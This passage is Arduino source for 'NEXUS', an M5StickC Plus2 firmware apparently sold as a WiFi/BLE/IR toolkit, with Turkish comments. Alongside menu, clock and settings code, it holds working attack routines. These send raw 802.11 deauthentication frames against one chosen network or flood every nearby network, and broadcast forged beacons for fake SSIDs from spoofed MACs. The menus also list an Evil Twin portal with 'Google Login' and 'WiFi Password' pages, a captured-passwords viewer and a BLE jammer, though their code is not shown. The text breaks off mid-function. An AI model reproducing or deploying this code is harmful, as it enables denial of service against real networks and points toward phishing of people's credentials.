#include <M5StickCPlus2.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <LittleFS.h>
#include <DNSServer.h>
#include <WebServer.h>

int menuIndex = 0;
String menuItems[] = {
  "WiFi",
  "BLE",
  "IR",
  "Files",
  "Clock",
  "Settings"
};
const int MENU_COUNT = 6;

// ====================== SUB MENU DİZİLERİ (HATA BURADAYDI) ======================
String wifiSubItems[] = {
  "< Back",
  "Connect WiFi",
  "WiFi Scan",
  "Target Attack",
  "Deauth Flood",
  "Beacon Spam",
  "Evil Twin"
};

String bleSubItems[] = {
  "< Back",
  "BadBLE",
  "BLE Scan",
  "BLE Jammer"
};

String irSubItems[] = {
  "< Back",
  "TV-B Gone",
  "IR Read",
  "Custom IR"
};

String filesSubItems[] = {
  "< Back",
  "LittleFS List",
  "LittleFS Info",
  "Captured PWs",
  "SD Info"
};

String settingsSubItems[] = {"< Back", "Brightness", "Sound", "Sleep Timer", "Set Time", "About"};

String evilTwinSubItems[] = {
  "< Back",
  "WiFi Password",
  "Google Login"
};
// ====================== DİZİLER BİTTİ ======================

// ====================== INACTIVITY SLEEP ======================
unsigned long lastActivity = 0;
bool screenOff = false;
unsigned long sleepTimeout = 15000;
int brightnessLevel = 255;

// forward declaration (drawSubMenu'den önce kullanılıyor)
bool inSubMenu = false;
int activeSub  = 0; // 0=WiFi,1=BLE,2=Settings,3=IR,4=Files,5=EvilTwin
int subMenuIndex = 0;

#define IR_PIN 19  // M5StickC Plus2 dahili IR LED (GPIO 19)
#define BUZZ_PIN 2 // M5StickC Plus2 dahili buzzer (GPIO 2)

bool soundEnabled = true; // Sound ayarı

void wakeIfNeeded() {
  if (screenOff) {
    screenOff = false;
    M5.Lcd.setBrightness(brightnessLevel);
    if (inSubMenu) drawSubMenu();
    else drawMenu();
  }
  lastActivity = millis();
}

// ====================== STATUS BAR ======================
void drawStatusBar() {
  if (screenOff) return;
  M5.Lcd.fillRect(0, 0, 240, 22, TFT_NAVY);
  
  int bat = M5.Power.getBatteryLevel();
  if(bat > 100) bat = 100;
  if(bat < 0) bat = 0;
  
  M5.Lcd.drawRect(8, 5, 22, 12, WHITE);
  M5.Lcd.drawRect(30, 8, 3, 6, WHITE);
  int fillW = (bat * 18) / 100;
  uint16_t batColor = (bat < 20) ? RED : (bat < 50 ? YELLOW : GREEN);
  M5.Lcd.fillRect(10, 7, fillW, 8, batColor);
  
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setCursor(38, 7);
  M5.Lcd.printf("%d%%", bat);
  
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(GREEN);
  M5.Lcd.setCursor(95, 3);
  M5.Lcd.print("NEXUS");
  
  m5::rtc_time_t rtcTime;
  M5.Rtc.getTime(&rtcTime);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(CYAN);
  M5.Lcd.setCursor(185, 7);
  M5.Lcd.printf("%02d:%02d", rtcTime.hours, rtcTime.minutes);
}

// ====================== DİNAMİK YEŞİL BARLI MENU ======================
void drawMenu() {
  if (screenOff) return;
  drawStatusBar();
  M5.Lcd.fillRect(0, 22, 240, 220, BLACK);
  
  int prev = (menuIndex - 1 + MENU_COUNT) % MENU_COUNT;
  int next = (menuIndex + 1) % MENU_COUNT;
  
  // prev item - üstte
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(WHITE);
  int prevW = M5.Lcd.textWidth(menuItems[prev]);
  M5.Lcd.setCursor((240 - prevW)/2, 30);
  M5.Lcd.print(menuItems[prev]);
  
  // ---- YEŞİL BAR: yazı genişliğine göre boyutlandırıldı ----
  // Ekran: 240x135, status bar: 22px → içerik: 22-135 (113px)
  // Bar dikey ortası: 22 + 113/2 = 78 → bar y=57, h=42
  M5.Lcd.setTextSize(3);
  String currText = menuItems[menuIndex];
  int currW = M5.Lcd.textWidth(currText);
  int textX = (240 - currW) / 2;
  int barPad = 14;
  M5.Lcd.fillRect(textX - barPad, 57, currW + barPad * 2, 42, GREEN);
  M5.Lcd.setTextColor(BLACK);
  M5.Lcd.setCursor(textX, 64);
  M5.Lcd.print(currText);
  // ----------------------------------------------------------

  // next item - bar bittikten hemen sonra (57+42=99), 99+4=103
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(WHITE);
  int nextW = M5.Lcd.textWidth(menuItems[next]);
  M5.Lcd.setCursor((240 - nextW)/2, 103);
  M5.Lcd.print(menuItems[next]);

  // ---- SAĞ TARAF POZİSYON GÖSTERGESİ ----
  // trackTop=26, trackH=104 → bottom=130, ekrana sığar (135px)
  int trackX   = 233;
  int trackTop = 26;
  int trackH   = 104;
  M5.Lcd.drawLine(trackX, trackTop, trackX, trackTop + trackH, 0x3186);
  int indH = trackH / MENU_COUNT;
  int indY = trackTop + (menuIndex * trackH / MENU_COUNT);
  M5.Lcd.fillRect(trackX - 2, indY, 5, indH, GREEN);
  // ----------------------------------------
}

// subMenuIndex, inSubMenu, activeSub yukarıda tanımlandı

void drawSubMenu() {
  if (screenOff) return;
  drawStatusBar();
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK);

  String* items;
  int count;
  if      (activeSub == 0) { items = wifiSubItems;      count = 7; }
  else if (activeSub == 1) { items = bleSubItems;       count = 4; }
  else if (activeSub == 2) { items = settingsSubItems;  count = 6; }
  else if (activeSub == 3) { items = irSubItems;        count = 4; }
  else if (activeSub == 4) { items = filesSubItems;     count = 5; }
  else                     { items = evilTwinSubItems;  count = 3; }

  // textSize(2) → her item 16px yüksek, 26px spacing ile 4 item = 104px < 113px
  const int SPACING   = 26;
  const int START_Y   = 26;
  const int VISIBLE   = 4; // ekrana sığan max item

  // Kaç item göstereceğiz
  int showCount = min(count, VISIBLE);

  // Scroll offset: seçili item her zaman görünür pencerede kalsın
  static int scrollOff   = 0;
  static int lastActiveSub = -1;
  if (activeSub != lastActiveSub) { scrollOff = 0; lastActiveSub = activeSub; }
  if (subMenuIndex < scrollOff)               scrollOff = subMenuIndex;
  if (subMenuIndex >= scrollOff + showCount)  scrollOff = subMenuIndex - showCount + 1;
  if (scrollOff < 0)                          scrollOff = 0;
  if (scrollOff > count - showCount)          scrollOff = max(0, count - showCount);

  M5.Lcd.setTextSize(2);
  for (int vi = 0; vi < showCount; vi++) {
    int i = scrollOff + vi;
    if (i >= count) break;

    if (i == subMenuIndex) {
      if (i == 0) M5.Lcd.setTextColor(BLACK, RED);
      else        M5.Lcd.setTextColor(BLACK, GREEN);
    } else {
      if (i == 0) M5.Lcd.setTextColor(RED);
      else        M5.Lcd.setTextColor(WHITE);
    }
    M5.Lcd.setTextWrap(false);
    M5.Lcd.setCursor(10, START_Y + vi * SPACING);
    M5.Lcd.print(items[i]);
    M5.Lcd.setTextWrap(true);
  }

  // Scroll göstergesi — sadece list taşıyorsa
  if (count > VISIBLE) {
    int trackX = 235, trackY = START_Y, trackH = showCount * SPACING;
    M5.Lcd.drawLine(trackX, trackY, trackX, trackY + trackH - 1, 0x3186);
    int thumbH = max(6, trackH / count);
    int thumbY = trackY + (scrollOff * (trackH - thumbH) / max(1, count - showCount));
    M5.Lcd.fillRect(trackX - 2, thumbY, 5, thumbH, GREEN);
  }

  // Hint
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(0x3186);
  M5.Lcd.setCursor(2, 126);
  M5.Lcd.print("PWR:back  B:down  A:select");
}

// ====================== CLOCK EKRANI ======================
void clockScreen() {
  bool clockExit = false;
  unsigned long lastClockDraw = 0;
  while (!clockExit) {
    M5.update();
    lastActivity = millis(); // uyku geçişini engelle

    // Ekranı saniyede 1 güncelle
    if (millis() - lastClockDraw >= 500) {
      lastClockDraw = millis();
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
      drawStatusBar();

      m5::rtc_time_t t;
      m5::rtc_date_t d;
      M5.Rtc.getTime(&t);
      M5.Rtc.getDate(&d);

      M5.Lcd.setTextSize(4);
      M5.Lcd.setTextColor(GREEN);
      char timeBuf[6];
      sprintf(timeBuf, "%02d:%02d", t.hours, t.minutes);
      int tw = M5.Lcd.textWidth(timeBuf);
      M5.Lcd.setCursor((240 - tw) / 2, 40);
      M5.Lcd.print(timeBuf);

      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(0x07E0);
      char secBuf[3];
      sprintf(secBuf, "%02d", t.seconds);
      int sw = M5.Lcd.textWidth(secBuf);
      M5.Lcd.setCursor((240 - sw) / 2, 88);
      M5.Lcd.print(secBuf);

      M5.Lcd.setTextSize(1);
      M5.Lcd.setTextColor(CYAN);
      char dateBuf[12];
      sprintf(dateBuf, "%04d-%02d-%02d", d.year, d.month, d.date);
      int dw = M5.Lcd.textWidth(dateBuf);
      M5.Lcd.setCursor((240 - dw) / 2, 112);
      M5.Lcd.print(dateBuf);

      M5.Lcd.setTextSize(1);
      M5.Lcd.setTextColor(0x3186);
      M5.Lcd.setCursor(2, 126);
      M5.Lcd.print("A:exit");
    }

    if (M5.BtnA.wasPressed()) clockExit = true; // kısa bas çıkar
    delay(30);
  }
  lastActivity = millis(); // çıkışta uykuya girmesin
  drawMenu();
}

// ====================== TARGET ATTACK (tek hedef deauth) ======================
void targetAttack() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
  drawStatusBar();
  M5.Lcd.setTextColor(CYAN); M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(4, 30); M5.Lcd.println("Scanning...");
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int n = WiFi.scanNetworks();
  if (n == 0) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4,50); M5.Lcd.println("No networks found!");
    delay(2000); return;
  }

  int targetIdx = 0;
  bool selected = false;
  auto showTargets = [&]() {
    M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
    drawStatusBar();
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(YELLOW);
    M5.Lcd.setCursor(4, 26); M5.Lcd.print("TARGET ATTACK - pick network");
    int perPage = 4;
    int pageStart = (targetIdx / perPage) * perPage;
    for (int i = pageStart; i < min(n, pageStart + perPage); i++) {
      if (i == targetIdx) M5.Lcd.setTextColor(BLACK, GREEN);
      else M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(4, 40 + (i - pageStart) * 20);
      M5.Lcd.printf("%d: %-16s %ddBm", i+1, WiFi.SSID(i).c_str(), WiFi.RSSI(i));
    }
    M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4,122);
    M5.Lcd.print("B:next  A:attack  PWR:back");
  };
  showTargets();
  while (!selected) {
    M5.update();
    lastActivity = millis(); // uyku geçişini engelle
    if (M5.BtnB.wasPressed()) { targetIdx = (targetIdx + 1) % n; showTargets(); }
    if (M5.BtnPWR.wasHold())  { lastActivity = millis(); return; } // uzun bas = çık
    if (M5.BtnPWR.wasPressed()) { targetIdx = (targetIdx - 1 + n) % n; showTargets(); }
    if (M5.BtnA.wasPressed()) selected = true;
    delay(30);
  }

  // BSSID, kanal ve SSID'yi WiFi.disconnect() ÖNCE kopyala
  uint8_t bssidCopy[6];
  memcpy(bssidCopy, WiFi.BSSID(targetIdx), 6);
  int ch = WiFi.channel(targetIdx);
  String ssidName = WiFi.SSID(targetIdx);

  uint8_t pkt[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00, 0x07,0x00
  };
  memcpy(&pkt[10], bssidCopy, 6);
  memcpy(&pkt[16], bssidCopy, 6);

  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  bool running = true; int sent = 0; unsigned long lastDraw = 0;
  while (running) {
    M5.update();
    lastActivity = millis(); // uyku engelle
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    sent++; delay(5);
    if (millis() - lastDraw > 350) {
      lastDraw = millis();
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
      M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(RED);
      M5.Lcd.setCursor(4,30); M5.Lcd.print("TARGET ATTACK");
      M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(4,54); M5.Lcd.printf("Target : %s", ssidName.c_str());
      M5.Lcd.setCursor(4,66); M5.Lcd.printf("CH:%d  Sent:%d", ch, sent);
      M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4,90); M5.Lcd.print("A: stop");
    }
    if (M5.BtnA.wasPressed()) running = false;
  }
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  lastActivity = millis(); // çıkışta uyuma
}

// ====================== DEAUTH FLOOD (tüm ağlara) ======================

void deauthFlood() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextColor(CYAN); M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(4,30); M5.Lcd.println("Scanning all networks...");
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int n = WiFi.scanNetworks();
  if (n == 0) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4,50); M5.Lcd.println("No networks found!");
    delay(2000); lastActivity = millis(); return;
  }

  // Tüm BSSID ve kanalları WiFi.disconnect() ÖNCE kopyala
  uint8_t bssids[20][6];
  int     channels[20];
  int safeN = min(n, 20);
  for (int i = 0; i < safeN; i++) {
    memcpy(bssids[i], WiFi.BSSID(i), 6);
    channels[i] = WiFi.channel(i);
  }

  uint8_t pkt[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00, 0x07,0x00
  };

  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);

  bool running = true; int sent = 0; int cur = 0;
  unsigned long lastDraw = 0;
  while (running) {
    M5.update();
    lastActivity = millis();
    memcpy(&pkt[10], bssids[cur], 6);
    memcpy(&pkt[16], bssids[cur], 6);
    esp_wifi_set_channel(channels[cur], WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    sent++; cur = (cur + 1) % safeN;
    delay(3);
    if (millis() - lastDraw > 350) {
      lastDraw = millis();
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
      M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(RED);
      M5.Lcd.setCursor(4,30); M5.Lcd.print("DEAUTH FLOOD");
      M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(4,54); M5.Lcd.printf("Targets: %d networks", safeN);
      M5.Lcd.setCursor(4,66); M5.Lcd.printf("Sent: %d", sent);
      M5.Lcd.setCursor(4,78); M5.Lcd.printf("BSSID: %02X:%02X:%02X...", bssids[cur][0], bssids[cur][1], bssids[cur][2]);
      M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4,100); M5.Lcd.print("A: stop");
    }
    if (M5.BtnA.wasPressed()) running = false;
  }
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  lastActivity = millis(); // çıkışta uyuma
}

// ====================== SETTINGS ACTIONS ======================
void settingsBrightness() {
  bool done = false;
  while (!done) {
    M5.update();
    lastActivity = millis(); // uyku geçişini engelle
    M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
    drawStatusBar();
    M5.Lcd.setTextSize(2);
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 30); M5.Lcd.print("Brightness");
    int barW = map(brightnessLevel, 10, 255, 0, 200);
    M5.Lcd.fillRect(20, 60, 200, 18, 0x2104);
    M5.Lcd.fillRect(20, 60, barW, 18, GREEN);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CYAN);
    M5.Lcd.setCursor(4, 86);
    M5.Lcd.printf("Level: %d", brightnessLevel);
    M5.Lcd.setTextColor(0x3186);
    M5.Lcd.setCursor(4, 108); M5.Lcd.print("B:up  PWR:down  A:save");
    if (M5.BtnB.wasPressed())   { brightnessLevel = min(255, brightnessLevel + 25); M5.Lcd.setBrightness(brightnessLevel); }
    if (M5.BtnPWR.wasPressed()) { brightnessLevel = max(10,  brightnessLevel - 25); M5.Lcd.setBrightness(brightnessLevel); }
    if (M5.BtnA.wasPressed())   done = true;
    delay(30);
  }
  lastActivity = millis(); // çıkışta uykuya girmesin
}

void settingsSound() {
  bool done = false;
  while (!done) {
    M5.update(); lastActivity = millis();
    M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
    M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 30); M5.Lcd.print("Sound");
    // Büyük ON/OFF göstergesi
    M5.Lcd.setTextSize(3);
    if (soundEnabled) {
      M5.Lcd.setTextColor(GREEN);
      M5.Lcd.setCursor(70, 58); M5.Lcd.print("ON");
    } else {
      M5.Lcd.setTextColor(RED);
      M5.Lcd.setCursor(58, 58); M5.Lcd.print("OFF");
    }
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(0x3186);
    M5.Lcd.setCursor(4, 108); M5.Lcd.print("B:toggle  A:save");
    if (M5.BtnB.wasPressed()) {
      soundEnabled = !soundEnabled;
      if (soundEnabled) beep(880, 80); // toggle sesi
    }
    if (M5.BtnA.wasPressed()) done = true;
    delay(30);
  }
  delay(150); M5.update(); // buton durumunu temizle, loop'a geçmesin
  lastActivity = millis();
}

void settingsSleepTimer() {
  unsigned long options[] = {10000, 15000, 30000, 60000, 0};
  String labels[]  = {"10s", "15s", "30s", "60s", "Never"};
  int optCount = 5;
  int sel = 1;
  // mevcut değeri bul
  for (int i = 0; i < optCount; i++) if (options[i] == sleepTimeout) { sel = i; break; }

  bool done = false;
  while (!done) {
    M5.update();
    M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
    drawStatusBar();
    M5.Lcd.setTextSize(2);
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 28); M5.Lcd.print("Sleep Timer");
    M5.Lcd.setTextSize(2);
    for (int i = 0; i < optCount; i++) {
      if (i == sel) M5.Lcd.setTextColor(BLACK, GREEN);
      else M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(20 + i * 44, 58);
      M5.Lcd.print(labels[i]);
    }
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(0x3186);
    M5.Lcd.setCursor(4, 108); M5.Lcd.print("B:next  A:save");
    if (M5.BtnB.wasPressed()) sel = (sel + 1) % optCount;
    if (M5.BtnA.wasPressed()) { sleepTimeout = options[sel]; done = true; }
    delay(30);
  }
}

void settingsAbout() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
  drawStatusBar();
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(GREEN);
  M5.Lcd.setCursor(4, 30); M5.Lcd.print("NEXUS v1.0");
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setCursor(4, 56); M5.Lcd.print("M5StickC Plus2");
  M5.Lcd.setCursor(4, 70); M5.Lcd.print("WiFi/BLE/IR toolkit");
  M5.Lcd.setTextColor(CYAN);
  M5.Lcd.setCursor(4, 90); M5.Lcd.print("github: github.com/dotch1r/Nexus-Firmware");
  M5.Lcd.setTextColor(0x3186);
  M5.Lcd.setCursor(4, 118); M5.Lcd.print("A: exit");
  bool ex = false;
  while (!ex) { M5.update(); if (M5.BtnA.wasPressed()) ex = true; delay(30); }
}
// ====================== CONNECT WiFi ======================
void cwShowNets(int n, int selIdx) {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(YELLOW);
  M5.Lcd.setCursor(4, 26); M5.Lcd.print("Select network:");
  int perPage = 4, pageStart = (selIdx / perPage) * perPage;
  for (int i = pageStart; i < min(n, pageStart + perPage); i++) {
    if (i == selIdx) M5.Lcd.setTextColor(BLACK, GREEN);
    else M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 40 + (i - pageStart) * 20);
    M5.Lcd.printf("%-16s %d", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
  }
  M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 122);
  M5.Lcd.print("B:dn PWR:up A:sel HoldPWR:exit");
}

void cwShowPw(const char* ssid, const String& pw, int charIdx) {
  const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$_- ";
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(YELLOW);
  M5.Lcd.setCursor(4, 26); M5.Lcd.printf("PW for: %.20s", ssid);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setCursor(4, 42); M5.Lcd.printf("> %.22s_", pw.c_str());
  M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(GREEN);
  M5.Lcd.setCursor(80, 60); M5.Lcd.printf("[%c]", chars[charIdx]);
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(0x3186);
  M5.Lcd.setCursor(4, 94);  M5.Lcd.print("B:next  PWR:prev  A:add");
  M5.Lcd.setCursor(4, 108); M5.Lcd.print("HoldA:done  HoldB:backspace");
}

void connectWifi() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextColor(CYAN); M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(4, 35); M5.Lcd.println("Scanning networks...");
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();
  if (n <= 0) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4,55); M5.Lcd.println("No networks found!");
    delay(2000); lastActivity = millis(); return;
  }

  // --- Ağ seç ---
  int selIdx = 0;
  cwShowNets(n, selIdx);
  bool selected = false;
  while (!selected) {
    M5.update(); lastActivity = millis();
    if (M5.BtnB.wasPressed())   { selIdx = (selIdx+1)%n;     cwShowNets(n, selIdx); }
    if (M5.BtnPWR.wasPressed()) { selIdx = (selIdx-1+n)%n;   cwShowNets(n, selIdx); }
    if (M5.BtnA.wasPressed())   { selected = true; }
    if (M5.BtnPWR.wasHold())    { lastActivity = millis(); return; } // çıkış
    delay(30);
  }

  // SSID + kanal'ı sakla (WiFi.begin sonrası scan cache temizlenebilir)
  char savedSSID[33]; strncpy(savedSSID, WiFi.SSID(selIdx).c_str(), 32); savedSSID[32]=0;
  int  savedCh = WiFi.channel(selIdx);

  // --- Şifre gir ---
  const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$_- ";
  const int charLen = 69;
  int charIdx = 0;
  String password = "";
  cwShowPw(savedSSID, password, charIdx);
  bool pwDone = false;
  while (!pwDone) {
    M5.update(); lastActivity = millis();
    if (M5.BtnB.wasPressed())   { charIdx = (charIdx+1) % charLen;       cwShowPw(savedSSID, password, charIdx); }
    if (M5.BtnPWR.wasPressed()) { charIdx = (charIdx-1+charLen)%charLen;  cwShowPw(savedSSID, password, charIdx); }
    if (M5.BtnA.wasPressed())   { password += chars[charIdx];             cwShowPw(savedSSID, password, charIdx); }
    if (M5.BtnA.wasHold())      { pwDone = true; }
    if (M5.BtnB.wasHold() && password.length()>0) { password.remove(password.length()-1); cwShowPw(savedSSID, password, charIdx); }
    if (M5.BtnPWR.wasHold())    { lastActivity = millis(); return; } // çıkış
    delay(30);
  }

  // --- Bağlan ---
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(CYAN);
  M5.Lcd.setCursor(4, 35); M5.Lcd.printf("Connecting to %s...", savedSSID);
  WiFi.begin(savedSSID, password.c_str());

  unsigned long t0 = millis();
  int dots = 0;
  while (WiFi.status() != WL_CONNECTED && millis()-t0 < 12000) {
    M5.update(); lastActivity = millis();
    M5.Lcd.fillRect(4, 52, 200, 10, BLACK);
    M5.Lcd.setCursor(4, 52); M5.Lcd.printf("%.1fs  %s", (millis()-t0)/1000.0, dots%3==0?".":(dots%3==1?"..":" "));
    dots++;
    delay(300);
  }

  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  if (WiFi.status() == WL_CONNECTED) {
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(GREEN);
    M5.Lcd.setCursor(4, 35); M5.Lcd.println("Connected!");
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 52); M5.Lcd.printf("IP  : %s", WiFi.localIP().toString().c_str());
    M5.Lcd.setCursor(4, 66); M5.Lcd.printf("SSID: %s", savedSSID);
    M5.Lcd.setCursor(4, 80); M5.Lcd.printf("RSSI: %d dBm", WiFi.RSSI());
  } else {
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(RED);
    M5.Lcd.setCursor(4, 35); M5.Lcd.println("Connection failed!");
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 52); M5.Lcd.println("Check password.");
  }
  M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 108); M5.Lcd.print("A: exit");
  bool ex = false;
  while (!ex) { M5.update(); lastActivity = millis(); if (M5.BtnA.wasPressed()) ex=true; delay(30); }
  lastActivity = millis();
}

// ====================== BEACON SPAM ======================
void beaconSpam() {
  const char* fakeSSIDs[] = {
    "FBI Surveillance Van", "NSA Mobile Unit", "CIA Ops",
    "Free Public WiFi",     "Totally Not A Trap", "Neighbour's WiFi",
    "Pretty Fly for a WiFi","Loading...",         "NEXUS_AP",
    "Get Your Own WiFi",    "Password is 1234",   "Not Your Network"
  };
  int ssidCount = 12;

  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true); // raw TX için gerekli
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);

  bool running   = true;
  int  cur       = 0;
  int  sentCount = 0;
  unsigned long lastDraw = 0;

  while (running) {
    M5.update(); lastActivity = millis();

    const char*   ssid    = fakeSSIDs[cur];
    uint8_t       ssidLen = strlen(ssid);

    // Sahte MAC (locally administered bit set)
    uint8_t mac[6] = {
      0x02, (uint8_t)(cur * 17),
      (uint8_t)random(256), (uint8_t)random(256),
      (uint8_t)random(256), (uint8_t)random(256)
    };

    // Raw 802.11 Beacon frame (radiotap YOK)
    // Header: 24 byte, Body: 12 + 2+ssidLen + 10
    uint8_t frame[200];
    memset(frame, 0, sizeof(frame));

    // --- 802.11 Management Header (24 byte) ---
    frame[0]  = 0x80; frame[1]  = 0x00; // Frame Control: Beacon
    frame[2]  = 0x00; frame[3]  = 0x00; // Duration
    // Addr1: destination (broadcast)
    memset(frame + 4, 0xFF, 6);
    // Addr2: source (sahte MAC)
    memcpy(frame + 10, mac, 6);
    // Addr3: BSSID (aynı sahte MAC)
    memcpy(frame + 16, mac, 6);
    // Seq control
    frame[22] = (sentCount & 0x0F) << 4;
    frame[23] = (sentCount >> 4) & 0xFF;

    // --- Beacon Frame Body (offset 24) ---
    // Timestamp (8 byte, 0)
    // Beacon interval: 100 TU = 0x64,0x00
    frame[32] = 0x64; frame[33] = 0x00;
    // Capability info: ESS
    frame[34] = 0x01; frame[35] = 0x04;

    // --- Information Elements (offset 36) ---
    int ie = 36;
    // SSID IE
    frame[ie++] = 0x00;       // Tag: SSID
    frame[ie++] = ssidLen;
    memcpy(frame + ie, ssid, ssidLen); ie += ssidLen;
    // Supported Rates IE
    frame[ie++] = 0x01;       // Tag: Supported Rates
    frame[ie++] = 0x08;       // Length
    uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
    memcpy(frame + ie, rates, 8); ie += 8;
    // DS Parameter Set (kanal)
    frame[ie++] = 0x03;       // Tag: DS Parameter Set
    frame[ie++] = 0x01;
    frame[ie++] = 0x06;       // Kanal 6

    esp_wifi_80211_tx(WIFI_IF_STA, frame, ie, false);
    sentCount++;
    cur = (cur + 1) % ssidCount;
    delay(5);

    if (millis() - lastDraw > 350) {
      lastDraw = millis();
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
      M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(YELLOW);
      M5.Lcd.setCursor(4, 30); M5.Lcd.print("BEACON SPAM");
      M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(4, 54); M5.Lcd.printf("SSIDs: %d", ssidCount);
      M5.Lcd.setCursor(4, 68); M5.Lcd.printf("Sent : %d", sentCount);
      M5.Lcd.setCursor(4, 82); M5.Lcd.printf("Now  : %s", fakeSSIDs[cur]);
      M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 102); M5.Lcd.print("A: stop");
    }
    if (M5.BtnA.wasPressed()) running = false;
  }
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  lastActivity = millis();
}

// ====================== SETTINGS: SET TIME ======================
void settingsSetTime() {
  m5::rtc_time_t t; m5::rtc_date_t d;
  M5.Rtc.getTime(&t); M5.Rtc.getDate(&d);

  int vals[6] = {d.year - 2000, d.month, d.date, t.hours, t.minutes, t.seconds};
  int mins[6]  = {24, 1,  1,  0,  0,  0};
  int maxs[6]  = {99, 12, 31, 23, 59, 59};
  const char* labels[6] = {"YR","MO","DY","HH","MM","SS"};
  int field = 0;

  auto showSet = [&]() {
